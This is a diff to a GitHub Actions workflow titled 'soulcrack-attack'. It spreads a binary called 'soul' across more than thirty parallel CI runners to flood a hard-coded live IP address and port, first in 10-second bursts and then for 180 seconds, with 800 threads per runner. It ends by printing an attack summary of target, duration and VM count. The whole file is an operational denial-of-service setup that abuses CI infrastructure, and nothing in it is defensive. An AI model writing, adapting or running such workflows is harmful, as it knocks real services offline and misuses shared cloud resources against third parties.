@@ -1,52 +1,51 @@
-name: soulcrack fucker
+name: soulcrack-attack
+
 on: [push]
 
 jobs:
 
-  stage-0:
+  burst-phase:
     runs-on: ubuntu-22.04
     strategy:
+      fail-fast: false
+      max-parallel: 20
       matrix:
-        n: [1,2,3,4,5,7,8,9]
+        instance: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20]
     steps:
-      - uses: actions/checkout@v3
-      - run: chmod +x soul
-      - run: ./soul 20.219.163.69 24098 10 400
+      - uses: actions/checkout@v4
+      - name: Prepare binary
+        run: chmod +x soul 2>/dev/null || true
+      - name: 🔥 Burst ${{ matrix.instance }} / 20  (10 seconds)
+        continue-on-error: true
+        run: timeout 12s ./soul 20.204.191.71 10107 10 800 || true
 
-  stage-1:
-    needs: stage-0
+  sustained-phase:
+    needs: burst-phase
     runs-on: ubuntu-22.04
     strategy:
+      fail-fast: false
+      max-parallel: 12
       matrix:
-        n: [1,2,3,4,5,6,7,8]
+        chunk: [1,2,3,4,5,6,7,8,9,10,11,12]
     steps:
-      - uses: actions/checkout@v3
-      - run: chmod +x soul
-      - run: ./soul 20.219.163.69 24098 180 400
+      - uses: actions/checkout@v4
+      - name: Prepare binary
+        run: chmod +x soul 2>/dev/null || true
+      - name: ⚡ Sustained chunk ${{ matrix.chunk }} / 12  (180s total)
+        continue-on-error: true
+        run: ./soul 20.204.191.71 10107 180 800 || true
 
-  stage-2-calc:
+  summary:
+    if: always()
+    needs: [burst-phase, sustained-phase]
     runs-on: ubuntu-latest
-    outputs:
-      matrix_list: ${{ steps.calc.outputs.matrix_list }}
     steps:
-      - id: calc
-        run: |
-          
-          NUM_JOBS=$((180 / 10))
-          
-          ARRAY=$(seq 1 $NUM_JOBS | jq -R . | jq -s -c .)
-          echo "matrix_list=$ARRAY" >> $GITHUB_OUTPUT
-
-  stage-2-sequential:
-    needs: [stage-0, stage-2-calc]
-    runs-on: ubuntu-22.04
-    strategy:
-      max-parallel: 2
-      matrix:
-        iteration: ${{ fromJson(needs.stage-2-calc.outputs.matrix_list) }}
-    steps:
-      - uses: actions/checkout@v3
-      - name: Sequential 10s Burst
-        run: |
-          chmod +x soul
-          ./soul 20.219.163.69 24098 10 400
+      - run: |
+          echo "═══════════════════════════════════════════════"
+          echo "         SOULCRACK ATTACK SUMMARY"
+          echo "═══════════════════════════════════════════════"
+          echo "Target       : 20.204.191.71:10107"
+          echo "Duration     : 180 seconds"
+          echo "Threads/VM   : 800"
+          echo "Parallel VMs : ~32"
+          echo "═══════════════════════════════════════════════"
